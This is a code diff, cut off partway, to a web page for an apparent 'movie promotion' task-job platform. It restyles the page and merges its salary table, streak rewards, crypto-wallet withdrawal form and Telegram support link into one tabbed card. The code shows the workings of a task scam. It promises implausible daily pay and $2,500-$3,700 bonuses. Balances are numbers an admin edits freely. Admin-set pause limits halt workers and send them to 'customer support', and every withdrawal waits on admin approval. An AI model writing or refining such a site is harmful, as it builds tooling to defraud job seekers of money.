@@ -9,12 +9,13 @@
   <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
   <style>
     :root {
-      --bg: #0d0d0d;
+      --bg: #121212;
       --card-bg: #ffffff;
       --border: #e2e8f0;
-      --primary: #ff6b00;
-      --primary-hover: #e05d00;
-      --text: #121212;
+      --primary: #eab308; /* Yellow Primary */
+      --primary-hover: #ca8a04;
+      --primary-light: #fef9c3;
+      --text: #0f172a;
       --text-muted: #64748b;
       --success: #16a34a;
       --warning: #d97706;
@@ -35,12 +36,12 @@
     h2, h3, h4 { margin-bottom: 12px; color: var(--text); }
     p { color: var(--text-muted); font-size: 0.9rem; margin-bottom: 12px; }
 
-    .btn { width: 100%; padding: 12px; border: none; border-radius: 10px; font-weight: 700; color: #fff; background: var(--primary); cursor: pointer; text-align: center; margin-top: 8px; text-decoration: none; display: inline-block; transition: background 0.2s ease; }
-    .btn:hover { background: var(--primary-hover); }
+    .btn { width: 100%; padding: 12px; border: none; border-radius: 10px; font-weight: 700; color: #000; background: var(--primary); cursor: pointer; text-align: center; margin-top: 8px; text-decoration: none; display: inline-block; transition: background 0.2s ease; }
+    .btn:hover { background: var(--primary-hover); color: #fff; }
     .btn-secondary { background: #f1f5f9; color: var(--text); border: 1px solid var(--border); }
     .btn-secondary:hover { background: #e2e8f0; }
     .btn-telegram { background: var(--telegram); color: #fff; }
-    
+
     label { display: block; font-size: 0.8rem; font-weight: 600; color: var(--text-muted); margin-bottom: 4px; }
     input, select, textarea { width: 100%; padding: 10px; border-radius: 8px; border: 1px solid var(--border); background: #f8fafc; color: var(--text); margin-bottom: 12px; font-size: 0.9rem; }
     input:focus, select:focus, textarea:focus { outline: 2px solid var(--primary); background: #fff; }
@@ -49,16 +50,28 @@
     .progress-fill { background: var(--primary); height: 100%; width: 0%; transition: width 0.3s ease; }
     .movie-box { border-radius: 12px; overflow: hidden; border: 1px solid var(--border); text-align: center; padding: 12px; background: #f8fafc; }
     .movie-box img { width: 100%; max-height: 250px; object-fit: cover; border-radius: 8px; margin-bottom: 12px; background: #e2e8f0; }
-    
+
     .stats-grid { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 8px; margin-bottom: 12px; }
     .stat-card { background: #f8fafc; padding: 10px 6px; border-radius: 8px; text-align: center; border: 1px solid var(--border); }
     .stat-card span { font-size: 0.75rem; color: var(--text-muted); font-weight: 600; display: block; }
-    .stat-card div { font-size: 1rem; font-weight: 800; color: var(--primary); margin-top: 4px; }
+    .stat-card div { font-size: 1rem; font-weight: 800; color: var(--primary-hover); margin-top: 4px; }
+
+    /* UNIFIED WORKER HUB TABS */
+    .hub-navigation { display: flex; gap: 6px; margin-top: 16px; border-bottom: 2px solid #e2e8f0; padding-bottom: 8px; }
+    .hub-tab-btn { flex: 1; border: none; background: #f1f5f9; color: var(--text-muted); padding: 8px 4px; border-radius: 8px; font-size: 0.75rem; font-weight: 700; cursor: pointer; text-align: center; transition: all 0.2s; }
+    .hub-tab-btn.active { background: var(--primary); color: #000; }
+    .hub-content-section { display: none; margin-top: 12px; }
+    .hub-content-section.active { display: block; }
+
+    /* SALARY & REWARDS */
+    .day-row { display: flex; justify-content: space-between; padding: 8px 0; border-bottom: 1px solid #f1f5f9; font-size: 0.85rem; font-weight: 600; }
+    .reward-box { background: var(--primary-light); border-radius: 10px; padding: 12px; margin-top: 10px; text-align: center; border: 1px solid #fef08a; }
+    .reward-val { font-size: 1.3rem; font-weight: 800; color: #854d0e; }
 
     .admin-section { border-top: 1px dashed var(--border); padding-top: 16px; margin-top: 16px; }
     .hidden { display: none !important; }
-    .tab-link { color: var(--primary); cursor: pointer; text-decoration: underline; font-weight: 700; }
-    
+    .tab-link { color: var(--primary-hover); cursor: pointer; text-decoration: underline; font-weight: 700; }
+
     .user-list-box { background: #f8fafc; border: 1px solid var(--border); border-radius: 8px; padding: 10px; max-height: 200px; overflow-y: auto; margin-bottom: 12px; }
     .user-item { display: flex; flex-direction: column; padding: 8px 0; border-bottom: 1px solid var(--border); font-size: 0.85rem; gap: 2px; }
 
@@ -67,21 +80,9 @@
     .avatar-group { display: flex; align-items: center; justify-content: center; margin-bottom: 8px; }
     .avatar { width: 40px; height: 40px; border-radius: 50%; border: 2px solid #ffffff; margin-left: -10px; background-size: cover; background-position: center; }
     .avatar:first-child { margin-left: 0; }
-    .star-rating { color: #ffb800; font-size: 1.2rem; margin-bottom: 4px; letter-spacing: 2px; }
+    .star-rating { color: #eab308; font-size: 1.2rem; margin-bottom: 4px; letter-spacing: 2px; }
     .trust-text { font-size: 0.95rem; font-weight: 700; color: #334155; }
     .trust-text span { font-weight: 800; color: #0f172a; }
-
-    /* FEATURE BADGES STYLING */
-    .feature-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 12px; }
-    .feature-box { background: #fff; border: 1px solid var(--border); border-radius: 12px; padding: 12px; text-align: center; font-size: 0.8rem; font-weight: 700; color: var(--text); }
-    .feature-icon { font-size: 1.4rem; color: var(--primary); margin-bottom: 4px; display: block; }
-
-    /* SALARY PACKAGE STYLING */
-    .salary-card { background: #ffffff; border-radius: 16px; padding: 16px; border: 1px solid var(--border); margin-top: 12px; }
-    .salary-title { text-align: center; font-size: 1.3rem; font-weight: 800; color: #0f172a; margin-bottom: 12px; text-transform: uppercase; letter-spacing: 1px; }
-    .day-row { display: flex; justify-content: space-between; padding: 6px 0; border-bottom: 1px solid #f1f5f9; font-size: 0.85rem; font-weight: 600; }
-    .reward-box { background: #f8fafc; border-radius: 10px; padding: 10px; margin-top: 10px; text-align: center; border: 1px solid var(--border); }
-    .reward-val { font-size: 1.2rem; font-weight: 800; color: var(--primary); }
 
     .modal-overlay { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: rgba(0, 0, 0, 0.7); display: flex; justify-content: center; align-items: center; z-index: 1000; padding: 16px; }
     .modal-box { background: #ffffff; border-radius: 16px; padding: 24px; max-width: 380px; width: 100%; text-align: center; box-shadow: 0 20px 25px -5px rgba(0,0,0,0.5); }
@@ -127,7 +128,6 @@
         </div>
       </div>
 
-      <!-- TRUST REVIEWS SECTION UNDER FRONT SIGN UP PAGE -->
       <div class="trust-badge-card">
         <div class="avatar-group">
           <div class="avatar" style="background-image: url('https://images.unsplash.com/photo-1534528741775-53994a69daeb?auto=format&fit=crop&w=100&q=80');"></div>
@@ -159,7 +159,7 @@
           </div>
           <div class="stat-card">
             <span>Processing</span>
-            <div id="processing-balance" style="color: var(--primary);">$0.00</div>
+            <div id="processing-balance" style="color: var(--primary-hover);">$0.00</div>
           </div>
         </div>
 
@@ -183,57 +183,64 @@
         <div id="movie-container" class="movie-box" style="margin-top:12px;">
           <img id="movie-img" src="" alt="Promo Movie">
           <h4 id="movie-title">Movie Promotion #1</h4>
-          <p id="admin-comment" style="font-style: italic; color: var(--primary);">Admin Comment: Ready to promote!</p>
+          <p id="admin-comment" style="font-style: italic; color: var(--primary-hover);">Admin Comment: Ready to promote!</p>
           <div style="font-weight: 700; color: var(--success); margin-bottom: 8px;">Reward: <span id="movie-reward">$0.50</span></div>
           <button class="btn" onclick="promoteMovie()">Promote This Movie</button>
         </div>
       </div>
 
-      <!-- SALARY PACKAGE SECTION -->
-      <div class="salary-card">
-        <div class="salary-title">Salary Package</div>
-        <div class="day-row"><span>Day 1</span> <span>$100 - $150</span></div>
-        <div class="day-row"><span>Day 2</span> <span>$100 - $300</span></div>
-        <div class="day-row"><span>Day 3</span> <span>$150 - $450</span></div>
-        <div class="day-row"><span>Day 4</span> <span>$200 - $600</span></div>
-        <div class="day-row"><span>Day 5</span> <span>$250 - $750</span></div>
-        <div class="day-row"><span>Day 6</span> <span>$300 - $900</span></div>
-        <div class="day-row"><span>Day 7</span> <span>$350 - $1,050</span></div>
-
-        <div class="reward-box">
-          <span style="font-size:0.8rem; font-weight:600; color:var(--text-muted);">4 Consecutive Days Reward</span>
-          <div class="reward-val">$2,500</div>
-        </div>
-        <div class="reward-box">
-          <span style="font-size:0.8rem; font-weight:600; color:var(--text-muted);">7 Consecutive Days Reward</span>
-          <div class="reward-val">$3,700</div>
-        </div>
-      </div>
-
-      <!-- FEATURES & SERVICE CARD -->
-      <div class="feature-grid">
-        <div class="feature-box"><span class="feature-icon">⚡</span>Instant Delivery</div>
-        <div class="feature-box"><span class="feature-icon">📈</span>High Success Rate</div>
-        <div class="feature-box"><span class="feature-icon">🎧</span>24/7 Support</div>
-        <div class="feature-box"><span class="feature-icon">🛡️</span>Secure & Safe</div>
-      </div>
-
+      <!-- SINGLE UNIFIED HUB CARD FOR SALARY, REWARDS, SUPPORT & WITHDRAWALS -->
       <div class="card" style="margin-top: 12px;">
-        <h3>Withdraw Earnings</h3>
-        <p>Request withdrawal once available balance is ready.</p>
-        <label>Crypto Wallet Address</label>
-        <input type="text" id="withdraw-wallet-address" placeholder="e.g. USDT, BTC, ETH">
-        <label>Withdrawal Amount ($)</label>
-        <input type="number" id="withdraw-amount-input" placeholder="0.00" step="0.01">
-        <button class="btn btn-secondary" onclick="requestWithdrawal()">Apply for Withdrawal</button>
-        <p id="withdraw-status" style="margin-top: 8px; font-size: 0.85rem; text-align: center;"></p>
-      </div>
+        <div class="hub-navigation">
+          <button class="hub-tab-btn active" onclick="switchHubTab('salary')">Salary</button>
+          <button class="hub-tab-btn" onclick="switchHubTab('rewards')">Rewards</button>
+          <button class="hub-tab-btn" onclick="switchHubTab('withdraw')">Withdraw</button>
+          <button class="hub-tab-btn" onclick="switchHubTab('support')">Support</button>
+        </div>
 
-      <!-- CUSTOMER SERVICE CARD -->
-      <div class="card" style="text-align: center; margin-top: 12px;">
-        <h3>Customer Service</h3>
-        <p>Contact our official support team on Telegram for help with tasks, salary packages, or withdrawals.</p>
-        <a id="telegram-support-btn" href="https://t.me/" target="_blank" class="btn btn-telegram">💬 Chat with Customer Service</a>
+        <!-- 1. SALARY PACKAGE -->
+        <div id="hub-salary" class="hub-content-section active">
+          <h4 style="text-align:center; text-transform:uppercase; margin-bottom:12px;">Salary Package</h4>
+          <div class="day-row"><span>Day 1</span> <span>$100 - $150</span></div>
+          <div class="day-row"><span>Day 2</span> <span>$100 - $300</span></div>
+          <div class="day-row"><span>Day 3</span> <span>$150 - $450</span></div>
+          <div class="day-row"><span>Day 4</span> <span>$200 - $600</span></div>
+          <div class="day-row"><span>Day 5</span> <span>$250 - $750</span></div>
+          <div class="day-row"><span>Day 6</span> <span>$300 - $900</span></div>
+          <div class="day-row"><span>Day 7</span> <span>$350 - $1,050</span></div>
+        </div>
+
+        <!-- 2. TWO CONSECUTIVE REWARDS -->
+        <div id="hub-rewards" class="hub-content-section">
+          <h4 style="text-align:center; text-transform:uppercase; margin-bottom:12px;">Consecutive Rewards</h4>
+          <div class="reward-box">
+            <span style="font-size:0.8rem; font-weight:700; color:#854d0e;">4 Consecutive Days Reward</span>
+            <div class="reward-val">$2,500</div>
+          </div>
+          <div class="reward-box" style="margin-top: 12px;">
+            <span style="font-size:0.8rem; font-weight:700; color:#854d0e;">7 Consecutive Days Reward</span>
+            <div class="reward-val">$3,700</div>
+          </div>
+        </div>
+
+        <!-- 3. WITHDRAWALS -->
+        <div id="hub-withdraw" class="hub-content-section">
+          <h4>Withdraw Earnings</h4>
+          <p>Request withdrawal once available balance is ready.</p>
+          <label>Crypto Wallet Address</label>
+          <input type="text" id="withdraw-wallet-address" placeholder="e.g. USDT, BTC, ETH">
+          <label>Withdrawal Amount ($)</label>
+          <input type="number" id="withdraw-amount-input" placeholder="0.00" step="0.01">
+          <button class="btn" onclick="requestWithdrawal()">Proceed Withdrawal</button>
+          <p id="withdraw-status" style="margin-top: 8px; font-size: 0.85rem; text-align: center;"></p>
+        </div>
+
+        <!-- 4. CUSTOMER SERVICE -->
+        <div id="hub-support" class="hub-content-section" style="text-align: center;">
+          <h4>Customer Service</h4>
+          <p>Contact our official support team on Telegram for assistance with tasks, salary packages, or withdrawals.</p>
+          <a id="telegram-support-btn" href="https://t.me/" target="_blank" class="btn btn-telegram">💬 Contact Customer Support</a>
+        </div>
       </div>
     </div>
 
@@ -285,7 +292,7 @@
             <input type="number" id="admin-user-processing-balance" step="0.01">
 
             <button class="btn btn-secondary" onclick="saveAdminUserSettings()">Update Member Settings</button>
-            <button class="btn" style="margin-top: 8px; background: #dc2626;" onclick="clearMemberPause()">Clear Pause & Resume Work</button>
+            <button class="btn" style="margin-top: 8px; background: #dc2626; color: #fff;" onclick="clearMemberPause()">Clear Pause & Resume Work</button>
             <button class="btn" style="margin-top: 8px;" onclick="approveNextSet()">Approve Set & Move to Next</button>
           </div>
 
@@ -326,7 +333,7 @@
           <div class="admin-section">
             <h4>Withdrawal Requests</h4>
             <p id="admin-withdraw-request-text">No active withdrawal request.</p>
-            <button class="btn" id="approve-withdraw-btn" style="background: var(--success); display: none;" onclick="approveWithdrawal()">Approve Withdrawal Request</button>
+            <button class="btn" id="approve-withdraw-btn" style="background: var(--success); color:#fff; display: none;" onclick="approveWithdrawal()">Approve Withdrawal Request</button>
           </div>
         </div>
       </div>
@@ -479,6 +486,17 @@
     window.savePictures = function() {
       localStorage.setItem('ve_pictures', JSON.stringify(window.globalPictureData));
     };
+
+    function switchHubTab(tabName) {
+      const tabs = document.querySelectorAll('.hub-tab-btn');
+      const sections = document.querySelectorAll('.hub-content-section');
+      
+      tabs.forEach(tab => tab.classList.remove('active'));
+      sections.forEach(sec => sec.classList.remove('active'));
+
+      event.currentTarget.classList.add('active');
+      document.getElementById('hub-' + tabName).classList.add('active');
+    }
 
     function showAuthTab(tab) {
       if (tab === 'signup') {
@@ -647,9 +665,9 @@
         item.className = 'user-item';
         const bal = typeof window.users[u].balance === 'number' ? window.users[u].balance.toFixed(2) : '0.00';
         item.innerHTML = `
-          <div style="display:flex; justify-style:space-between; font-weight:700;">
+          <div style="display:flex; justify-content:space-between; font-weight:700;">
             <span>${u} <small>($${bal})</small></span>
-            <span style="color:var(--primary);">${window.users[u].browser || 'Browser'} / ${window.users[u].device || 'Device'}</span>
+            <span style="color:var(--primary-hover);">${window.users[u].browser || 'Browser'} / ${window.users[u].device || 'Device'}</span>
           </div>
           <div style="font-size:0.75rem; color:var(--text-muted);">${window.users[u].email || 'No email'}</div>
         `;
@@ -672,225 +690,215 @@
       document.getElementById('admin-pause-message').value = user.pauseMessage || "You have reached a pause milestone. Kindly contact customer support to proceed to the next task.";
       document.getElementById('admin-user-set-select').value = user.currentSet || 1;
 
-      const wReqText = document.getElementById('admin-withdraw-request-text');
-      const wApproveBtn = document.getElementById('approve-withdraw-btn');
+      const reqText = document.getElementById('admin-withdraw-request-text');
+      const approveBtn = document.getElementById('approve-withdraw-btn');
 
       if (user.withdrawalStatus === 'Pending') {
-        const wAmt = user.withdrawalAmount || user.balance || 0;
-        wReqText.innerHTML = `<strong>${selectedUser}</strong> requested <strong>$${wAmt.toFixed(2)}</strong><br><small>Wallet: ${user.walletAddress || 'N/A'}</small>`;
-        wApproveBtn.style.display = 'block';
+        reqText.innerHTML = `<strong>${selectedUser}</strong> requested withdrawal of <strong>$${user.withdrawalAmount.toFixed(2)}</strong> to wallet <code>${user.walletAddress}</code>.`;
+        approveBtn.style.display = 'block';
       } else {
-        wReqText.innerText = 'No pending withdrawal requests for this member.';
-        wApproveBtn.style.display = 'none';
+        reqText.innerText = `No active withdrawal request for ${selectedUser}.`;
+        approveBtn.style.display = 'none';
       }
     }
 
     async function saveAdminUserSettings() {
-      const selectedUser = document.getElementById('admin-selected-user').value;
+      const select = document.getElementById('admin-selected-user');
+      if (!select) return;
+      const selectedUser = select.value;
       if (!selectedUser || !window.users[selectedUser]) return;
 
-      const newBal = parseFloat(document.getElementById('admin-user-balance').value) || 0;
-      const newProcBal = parseFloat(document.getElementById('admin-user-processing-balance').value) || 0;
-      const stopNum = parseInt(document.getElementById('admin-stop-work-num').value) || 16;
-      const setNum = parseInt(document.getElementById('admin-user-set-select').value) || 1;
-      const pauseMsg = document.getElementById('admin-pause-message').value.trim();
-
-      window.users[selectedUser].balance = newBal;
-      window.users[selectedUser].processingBalance = newProcBal;
-      window.users[selectedUser].stopLimit = stopNum;
-      window.users[selectedUser].pauseMessage = pauseMsg;
-      
-      if (window.users[selectedUser].currentSet !== setNum) {
-        window.users[selectedUser].currentSet = setNum;
-        window.users[selectedUser].completedInSet = 0;
-      }
-
-      if (window.users[selectedUser].completedInSet < stopNum) {
-        window.users[selectedUser].isSetApproved = true;
-      }
-
-      window.saveUsers();
-      if (window.saveUserToFirebase) {
-        await window.saveUserToFirebase(window.users[selectedUser]);
-      }
-      window.populateAdminUsers();
-      renderUI();
-      alert(`Updated settings for ${selectedUser}!`);
-    }
-
-    async function clearMemberPause() {
-      const selectedUser = document.getElementById('admin-selected-user').value;
-      if (!selectedUser || !window.users[selectedUser]) return;
-
-      window.users[selectedUser].stopLimit = 16;
-      window.users[selectedUser].isSetApproved = true;
-
-      window.saveUsers();
-      if (window.saveUserToFirebase) {
-        await window.saveUserToFirebase(window.users[selectedUser]);
-      }
-      window.populateAdminUsers();
-      renderUI();
-      alert(`Cleared pause for ${selectedUser}! Member can now continue tasks.`);
-    }
-
-    async function promoteMovie() {
-      if (!currentUser || !window.users[currentUser]) return;
-
-      const user = window.users[currentUser];
-      const maxWork = user.stopLimit || 16;
-
-      if (user.completedInSet >= maxWork || user.isSetApproved === false) return;
-
-      const key = `${user.currentSet}-${user.completedInSet + 1}`;
-      const reward = parseFloat(window.globalPictureData[key]?.reward || 0.50);
-
-      user.completedInSet += 1;
-      user.balance = (user.balance || 0) + reward;
-
-      if (user.completedInSet >= maxWork) {
-        user.isSetApproved = false;
-      }
+      const user = window.users[selectedUser];
+      user.balance = parseFloat(document.getElementById('admin-user-balance').value) || 0;
+      user.processingBalance = parseFloat(document.getElementById('admin-user-processing-balance').value) || 0;
+      user.stopLimit = parseInt(document.getElementById('admin-stop-work-num').value) || 16;
+      user.pauseMessage = document.getElementById('admin-pause-message').value.trim();
+      user.currentSet = parseInt(document.getElementById('admin-user-set-select').value) || 1;
 
       window.saveUsers();
       if (window.saveUserToFirebase) {
         await window.saveUserToFirebase(user);
       }
-
-      document.getElementById('modal-reward-text').innerText = `You earned $${reward.toFixed(2)} for completing promotion #${user.completedInSet}!`;
-      document.getElementById('promo-modal').classList.remove('hidden');
+      alert(`Settings updated for ${selectedUser}`);
+      renderUI();
     }
 
-    function closeModal() {
-      document.getElementById('promo-modal').classList.add('hidden');
+    async function clearMemberPause() {
+      const select = document.getElementById('admin-selected-user');
+      if (!select) return;
+      const selectedUser = select.value;
+      if (!selectedUser || !window.users[selectedUser]) return;
+
+      const user = window.users[selectedUser];
+      user.stopLimit = 16;
+      user.pauseMessage = '';
+      user.isSetApproved = true;
+
+      window.saveUsers();
+      if (window.saveUserToFirebase) {
+        await window.saveUserToFirebase(user);
+      }
+      document.getElementById('admin-stop-work-num').value = 16;
+      document.getElementById('admin-pause-message').value = '';
+      alert(`Pause cleared for ${selectedUser}. User can now continue tasks.`);
       renderUI();
     }
 
     async function approveNextSet() {
-      const selectedUser = document.getElementById('admin-selected-user').value;
-      if (!selectedUser || !window.users[selectedUser]) {
-        alert('Please select a member first.');
-        return;
-      }
+      const select = document.getElementById('admin-selected-user');
+      if (!select) return;
+      const selectedUser = select.value;
+      if (!selectedUser || !window.users[selectedUser]) return;
 
       const user = window.users[selectedUser];
       if (user.currentSet < 3) {
         user.currentSet += 1;
         user.completedInSet = 0;
         user.stopLimit = 16;
+        user.pauseMessage = '';
         user.isSetApproved = true;
+
         window.saveUsers();
         if (window.saveUserToFirebase) {
           await window.saveUserToFirebase(user);
         }
-        window.populateAdminUsers();
-        renderUI();
-        alert(`Approved Set for ${selectedUser}! Moved to Set ${user.currentSet}.`);
+        alert(`Approved! ${selectedUser} is now moved to Set ${user.currentSet}.`);
       } else {
         alert(`${selectedUser} has already completed all 3 sets!`);
       }
-    }
-
-    async function requestWithdrawal() {
-      if (!currentUser || !window.users[currentUser]) return;
-      const user = window.users[currentUser];
-
-      const addr = document.getElementById('withdraw-wallet-address').value.trim();
-      const amt = parseFloat(document.getElementById('withdraw-amount-input').value) || 0;
-
-      if (!addr || amt <= 0) {
-        alert('Please enter a valid wallet address and amount.');
-        return;
-      }
-
-      if (amt > (user.balance || 0)) {
-        alert('Withdrawal amount exceeds your current available balance!');
-        return;
-      }
-
-      user.withdrawalStatus = 'Pending';
-      user.withdrawalAmount = amt;
-      user.walletAddress = addr;
-
-      window.saveUsers();
-      if (window.saveUserToFirebase) {
-        await window.saveUserToFirebase(user);
-      }
       renderUI();
-      alert('Withdrawal request submitted successfully!');
-    }
-
-    async function approveWithdrawal() {
-      const selectedUser = document.getElementById('admin-selected-user').value;
-      if (!selectedUser || !window.users[selectedUser]) return;
-
-      const user = window.users[selectedUser];
-      const amt = user.withdrawalAmount || user.balance || 0;
-
-      user.balance = Math.max(0, (user.balance || 0) - amt);
-      user.withdrawalStatus = 'Approved';
-      user.withdrawalAmount = 0;
-
-      window.saveUsers();
-      if (window.saveUserToFirebase) {
-        await window.saveUserToFirebase(user);
-      }
-      window.populateAdminUsers();
-      renderUI();
-      alert(`Withdrawal request approved for ${selectedUser}!`);
     }
 
     async function savePictureAndSettings() {
       const setNum = document.getElementById('edit-set-num').value;
-      const imgIndex = document.getElementById('edit-img-index').value;
-      const reward = parseFloat(document.getElementById('edit-img-reward').value) || 0.50;
-      const comment = document.getElementById('edit-img-comment').value.trim();
+      const imgIdx = document.getElementById('edit-img-index').value;
       const fileInput = document.getElementById('edit-img-file');
+      const rewardVal = parseFloat(document.getElementById('edit-img-reward').value) || 0.50;
+      const commentVal = document.getElementById('edit-img-comment').value.trim();
 
-      const key = `${setNum}-${imgIndex}`;
-      let existingPic = window.globalPictureData[key]?.url || 'https://via.placeholder.com/400x220?text=Movie+Promo';
+      const key = `s${setNum}_p${imgIdx}`;
+      if (!window.globalPictureData[key]) window.globalPictureData[key] = {};
+
+      const saveObj = {
+        reward: rewardVal,
+        comment: commentVal
+      };
 
       if (fileInput.files && fileInput.files[0]) {
         const reader = new FileReader();
         reader.onload = async function(e) {
-          const picData = {
-            url: e.target.result,
-            reward: reward,
-            comment: comment || 'Admin Featured Promotion'
-          };
-          window.globalPictureData[key] = picData;
+          saveObj.imgUrl = e.target.result;
+          window.globalPictureData[key] = { ...window.globalPictureData[key], ...saveObj };
           window.savePictures();
           if (window.savePicturesToFirebase) {
-            await window.savePicturesToFirebase(key, picData);
+            await window.savePicturesToFirebase(key, window.globalPictureData[key]);
           }
+          alert(`Picture and details updated for Set ${setNum}, Image #${imgIdx}`);
           renderUI();
-          alert(`Saved picture and details for Set ${setNum} Picture #${imgIndex}!`);
         };
         reader.readAsDataURL(fileInput.files[0]);
       } else {
-        const picData = {
-          url: existingPic,
-          reward: reward,
-          comment: comment || 'Admin Featured Promotion'
-        };
-        window.globalPictureData[key] = picData;
+        window.globalPictureData[key] = { ...window.globalPictureData[key], ...saveObj };
         window.savePictures();
         if (window.savePicturesToFirebase) {
-          await window.savePicturesToFirebase(key, picData);
+          await window.savePicturesToFirebase(key, window.globalPictureData[key]);
         }
+        alert(`Details updated for Set ${setNum}, Image #${imgIdx}`);
         renderUI();
-        alert(`Saved details for Set ${setNum} Picture #${imgIndex}!`);
       }
+    }
+
+    async function promoteMovie() {
+      if (!currentUser || !window.users[currentUser]) return;
+
+      const u = window.users[currentUser];
+      const nextImgNum = u.completedInSet + 1;
+      const key = `s${u.currentSet}_p${nextImgNum}`;
+      const picInfo = window.globalPictureData[key] || {};
+      const reward = picInfo.reward !== undefined ? picInfo.reward : 0.50;
+
+      u.completedInSet += 1;
+      u.balance += reward;
+
+      window.saveUsers();
+      if (window.saveUserToFirebase) {
+        await window.saveUserToFirebase(u);
+      }
+
+      document.getElementById('modal-reward-text').innerText = `You earned $${reward.toFixed(2)} for completing this promotion task!`;
+      document.getElementById('promo-modal').classList.remove('hidden');
+
+      renderUI();
+    }
+
+    function closeModal() {
+      document.getElementById('promo-modal').classList.add('hidden');
+    }
+
+    async function requestWithdrawal() {
+      if (!currentUser || !window.users[currentUser]) return;
+      const u = window.users[currentUser];
+
+      const wallet = document.getElementById('withdraw-wallet-address').value.trim();
+      const amount = parseFloat(document.getElementById('withdraw-amount-input').value) || 0;
+
+      if (!wallet || amount <= 0) {
+        alert('Please enter a valid wallet address and amount.');
+        return;
+      }
+
+      if (amount > u.balance) {
+        alert('Insufficient balance!');
+        return;
+      }
+
+      u.balance -= amount;
+      u.processingBalance += amount;
+      u.withdrawalStatus = 'Pending';
+      u.withdrawalAmount = amount;
+      u.walletAddress = wallet;
+
+      window.saveUsers();
+      if (window.saveUserToFirebase) {
+        await window.saveUserToFirebase(u);
+      }
+
+      alert('Withdrawal request submitted successfully!');
+      renderUI();
+    }
+
+    async function approveWithdrawal() {
+      const select = document.getElementById('admin-selected-user');
+      if (!select) return;
+      const selectedUser = select.value;
+      if (!selectedUser || !window.users[selectedUser]) return;
+
+      const u = window.users[selectedUser];
+      u.processingBalance = Math.max(0, u.processingBalance - u.withdrawalAmount);
+      u.withdrawalStatus = 'Approved';
+
+      window.saveUsers();
+      if (window.saveUserToFirebase) {
+        await window.saveUserToFirebase(u);
+      }
+
+      alert(`Withdrawal approved for ${selectedUser}`);
+      loadAdminUserData();
+      renderUI();
     }
 
     function renderUI() {
       const authView = document.getElementById('auth-view');
       const workerView = document.getElementById('worker-view');
+      const adminView = document.getElementById('admin-view');
 
-      const telegramBtn = document.getElementById('telegram-support-btn');
-      const supportSetLink = document.getElementById('support-set-link');
-      if (telegramBtn) telegramBtn.href = window.telegramLink;
-      if (supportSetLink) supportSetLink.href = window.telegramLink;
+      const tgBtns = [
+        document.getElementById('telegram-support-btn'),
+        document.getElementById('support-set-link')
+      ];
+      tgBtns.forEach(b => { if (b) b.href = window.telegramLink; });
+
+      if (!adminView.classList.contains('hidden')) return;
 
       if (!currentUser || !window.users[currentUser]) {
         authView.classList.remove('hidden');
@@ -901,58 +909,57 @@
       authView.classList.add('hidden');
       workerView.classList.remove('hidden');
 
-      const user = window.users[currentUser];
-      document.getElementById('user-display-name').innerText = user.username;
-      document.getElementById('current-set-display').innerText = `Set ${user.currentSet || 1} / 3`;
-      document.getElementById('worker-balance').innerText = `$${(user.balance || 0).toFixed(2)}`;
-      document.getElementById('processing-balance').innerText = `$${(user.processingBalance || 0).toFixed(2)}`;
+      const u = window.users[currentUser];
 
-      const completed = user.completedInSet || 0;
-      const maxWork = user.stopLimit || 16;
+      document.getElementById('user-display-name').innerText = u.username;
+      document.getElementById('current-set-display').innerText = `${u.currentSet} / 3`;
+      document.getElementById('set-num-text').innerText = u.currentSet;
+      document.getElementById('worker-balance').innerText = `$${(u.balance || 0).toFixed(2)}`;
+      document.getElementById('processing-balance').innerText = `$${(u.processingBalance || 0).toFixed(2)}`;
 
-      document.getElementById('set-num-text').innerText = user.currentSet || 1;
-      document.getElementById('progress-text').innerText = `${completed} / ${maxWork} Completed`;
+      const completed = u.completedInSet || 0;
+      document.getElementById('progress-text').innerText = `${completed} / 16 Completed`;
+      const fillPct = (completed / 16) * 100;
+      document.getElementById('progress-fill').style.width = `${fillPct}%`;
 
-      const pct = Math.min(100, Math.round((completed / maxWork) * 100));
-      document.getElementById('progress-fill').style.width = `${pct}%`;
-
-      const completedMsgBox = document.getElementById('completed-set-message');
-      const movieBox = document.getElementById('movie-container');
+      const pauseMsgCard = document.getElementById('completed-set-message');
       const pauseReasonText = document.getElementById('pause-reason-text');
+      const movieBox = document.getElementById('movie-container');
 
-      if (completed >= maxWork || user.isSetApproved === false) {
-        completedMsgBox.classList.remove('hidden');
+      const isPaused = (completed >= u.stopLimit) || (completed >= 16);
+
+      if (isPaused) {
         movieBox.classList.add('hidden');
-        if (user.pauseMessage) {
-          pauseReasonText.innerText = user.pauseMessage;
+        pauseMsgCard.classList.remove('hidden');
+
+        if (completed >= 16) {
+          pauseReasonText.innerText = u.pauseMessage || `You have completed Set ${u.currentSet}! Kindly contact customer support to proceed to the next set.`;
         } else {
-          pauseReasonText.innerText = "You have reached a pause milestone! Kindly contact customer support to proceed to the next set.";
+          pauseReasonText.innerText = u.pauseMessage || "You have reached a pause milestone. Kindly contact customer support to proceed.";
         }
       } else {
-        completedMsgBox.classList.add('hidden');
+        pauseMsgCard.classList.add('hidden');
         movieBox.classList.remove('hidden');
 
-        const key = `${user.currentSet || 1}-${completed + 1}`;
-        const picObj = window.globalPictureData[key];
+        const nextImgNum = completed + 1;
+        const key = `s${u.currentSet}_p${nextImgNum}`;
+        const picInfo = window.globalPictureData[key] || {};
 
-        const imgEl = document.getElementById('movie-img');
-        const titleEl = document.getElementById('movie-title');
-        const commentEl = document.getElementById('admin-comment');
-        const rewardEl = document.getElementById('movie-reward');
-
-        imgEl.src = picObj?.url || 'https://images.unsplash.com/photo-1489599849927-2ee91cede3ba?auto=format&fit=crop&w=600&q=80';
-        titleEl.innerText = `Set ${user.currentSet || 1} - Promotion #${completed + 1}`;
-        commentEl.innerText = picObj?.comment ? `Admin Comment: ${picObj.comment}` : 'Admin Comment: Ready to promote!';
-        rewardEl.innerText = `$${parseFloat(picObj?.reward || 0.50).toFixed(2)}`;
+        document.getElementById('movie-img').src = picInfo.imgUrl || `https://images.unsplash.com/photo-1489599849927-2ee91cede3ba?auto=format&fit=crop&w=600&q=80`;
+        document.getElementById('movie-title').innerText = `Movie Promotion #${nextImgNum} (Set ${u.currentSet})`;
+        document.getElementById('admin-comment').innerText = picInfo.comment ? `Admin Comment: ${picInfo.comment}` : 'Admin Comment: Ready to promote!';
